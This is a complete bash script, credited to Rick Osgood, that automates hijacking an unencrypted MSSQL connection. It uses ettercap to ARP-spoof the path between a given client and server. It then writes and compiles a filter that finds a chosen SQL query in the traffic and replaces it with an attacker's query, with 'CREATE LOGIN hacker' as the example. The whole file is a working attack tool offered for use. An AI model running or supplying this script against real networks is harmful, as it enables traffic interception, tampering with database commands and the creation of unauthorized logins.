#!/bin/bash
#
####################################################################
#
# Written by Rick Osgood
#
# This script is designed to automate the process of hijacking an
# MSSQL database connection. This script can be used to perform a
# MITM attack between two IP addresses using ettercap and ARP
# spoofing. You also submit an original SQL query and a new SQL
# query. The script will create, compile, and load an ettercap
# filter to replace the original SQL string with your new one.
# This should work on any MSSQL conncetion that is not encrypted.
#
####################################################################
 
args=("$@") #array to store command line arguments
 
# Set variable defalts
SqlPort=1433 
ServerIP="NULL"
ClientIP="NULL"
FileName="NULL"
 
# Help function
print_help(){
        echo "Usage: ./SQLInject.sh -o [original SQL query] -i [new SQL query] -s [MSSQL Server IP] 
-c [SQL Client IP]"
        echo ""
        echo "Example: ./SQLInject.sh -o \"SELECT * from Products WHERE ProductID=1;\" -i \"CREATE L
OGIN hacker WITH PASSWORD=\"password01\";\" -s 10.0.1.20 -c 10.0.1.100"
        echo ""
        echo "This script creates an ettercap filter that will identify a SQL string"
        echo "and replace it with a new string. The script will then compile the filter"
        echo "and run ettercap with the filter loaded. Ettercap will perform an ARP"
        echo "spoofing attack against the specified IP addresses automatically. All you"
        echo "have to do is sit back and wait for the original query to be submitted."
        echo ""
        echo " --help"
        echo "     Show this message."
        echo " -o"
        echo "     Specify the original SQL string to be replaced."
        echo " -i"
        echo "     Specify the new SQL string to be injected. This string must not"
        echo "     longer than the original query string."
        echo " -s"
        echo "     Specify the MSSQL server IP for ARP poison attack. May also use gateway IP"
        echo " -c"
        echo "     Specify the SQL cient IP for ARP poison attack."
        echo " -f"
        echo "     Specify the output filename for the ettercap filter."
        echo " -p"
        echo "     Optional. Specifiy the MSSQL traffic port. Defaults to 1433."
}
 
# If not enough arguments then quit
if [ $# -lt "4" ]; then
        print_help
        exit 1
fi
 
COUNTER=0 #Count from zero to number of arguments
while [ $COUNTER -lt $# ]; do
        if [ "${args[$COUNTER]}" == "--help" ]; then
                print_help
                exit 0
 
        elif [ "${args[$COUNTER]}" == "-o" ]; then
                COUNTER=$(($COUNTER+1))
                OldQuery=${args[$COUNTER]}
 
        elif [ "${args[$COUNTER]}" == "-i" ]; then
                COUNTER=$((COUNTER+1))
                NewQuery=${args[$COUNTER]}
 
        elif [ "${args[$COUNTER]}" == "-s" ]; then
                COUNTER=$((COUNTER+1))
                ServerIP=${args[$COUNTER]}
 
        elif [ "${args[$COUNTER]}" == "-c" ]; then
                COUNTER=$((COUNTER+1))
                ClientIP=${args[$COUNTER]}
 
        elif [ "${args[$COUNTER]}" == "-f" ]; then
                COUNTER=$((COUNTER+1))
                FileName=${args[$COUNTER]}
 
        elif [ "${args[$COUNTER]}" == "-p" ]; then
                COUNTER=$((COUNTER+1))
                SqlPort=${args[$COUNTER]}
 
        else
                echo "Error: Unknown argument \"${args[$COUNTER]}\""
                echo ""
                print_help
                exit 1
        fi
 
        COUNTER=$(($COUNTER+1))
done;
 
# Is anything missing?
if [ "$ServerIP" == "NULL" ]; then
        echo "You must specify server IP!"
        exit 1
 
elif [ "$ClientIP" == "NULL" ]; then
        echo "You must specify client IP!"
        exit 1
 
elif [ "$FileName" == "NULL" ]; then
        echo "You must specify the file name for the ettercap filter!"
        exit 1
fi
 
# Calculate length of injected SQL query
length2=`echo $NewQuery | wc -m`
length2=$((length2 - 1))
echo "New string is $length2 bytes"
 
# Calculate length of original SQL query
length1=`echo $OldQuery | wc -m`
length1=$((length1 - 1))
echo "Original string is $length1 bytes"
 
# What's the difference?
difference=$((length1 - length2))
echo "Difference is $difference bytes"
 
# If the new string is too long it won't work
if [ $difference -lt 0 ]; then
        echo ""
        echo "New SQL query is longer than original! Quitting..."
        exit 0
fi
 
temp=""
for i in `seq 1 $difference`;
do
        temp="$temp "
done
PaddedQuery="$NewQuery$temp"
echo "PaddedQuery is \"$PaddedQuery\""
echo ""
 
IFS=$'\n' # change separater to newline only. Required or the for loop skips spaces
 
echo "Converting original query to hex..."
# Convert original query to hex string with NULL padding (How it appears over the wire)
OldQueryHex=""
for line in $(echo $OldQuery | sed -e 's/\(.\)/\1\n/g')
do
        OldQueryHex="$OldQueryHex\x"
        temp=`echo $line | hexdump -C |head -n1 | awk -F"  " {'print $2'} | awk {'print $1'}`
        OldQueryHex="$OldQueryHex$temp"
        OldQueryHex="$OldQueryHex\x00"
done
 
echo "Converting new query to hex..."
# Convert new query to hex string now.
NewQueryHex=""
for line in $(echo $PaddedQuery | sed -e 's/\(.\)/\1\n/g')
do
        NewQueryHex="$NewQueryHex\x"
        temp=`echo $line | hexdump -C |head -n1 | awk -F"  " {'print $2'} | awk {'print $1'}`
        NewQueryHex="$NewQueryHex$temp" 
        NewQueryHex="$NewQueryHex\x00"
done
 
echo "Writing ettercap filter now..."
 
# Start writing actual ettercap filter file
echo "if (ip.proto == TCP && tcp.dst == $SqlPort) {" > $FileName
echo "       msg(\"SQL traffic discovered\");" >> $FileName
echo "       if (search(DATA.data,\"$OldQueryHex\")) {" >> $FileName
echo "              msg(\"Found our string!\");" >> $FileName
echo "              replace(\"$OldQueryHex\",\"$NewQueryHex\");" >> $FileName
echo "              msg(\"...and replaced it :)\");" >> $FileName
echo "       }" >> $FileName
echo "}" >> $FileName
 
# Exeute etterfilter to create the compiled filter
etterfilter $FileName -o $FileName.ef
 
# Execute ettercap and load the filter
ettercap -T -q -F ./$FileName.ef -M ARP //$ServerIP// //$ClientIP//
 
echo ""
echo "Completed Successfully!"
